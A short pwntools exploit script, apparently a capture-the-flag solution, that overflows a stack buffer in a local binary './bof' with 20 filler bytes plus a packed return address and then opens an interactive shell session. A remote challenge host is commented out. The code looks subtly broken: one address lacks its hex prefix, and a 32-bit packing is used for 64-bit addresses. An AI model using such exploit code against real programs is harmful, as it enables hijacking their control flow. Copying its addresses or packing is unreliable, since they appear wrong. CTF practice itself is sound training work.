# coding=utf-8
from pwn import *

gets = 0x400725
target = 400687

stack = 0x7fffffffe440
ret =   0x7fffffffe478
#r = remote('pre-exam-pwn.ais3.org', 10000)
r = process('./bof')

r.recvuntil('challenges')
r.sendline('a'*20 + p32(target))
r.interactive()
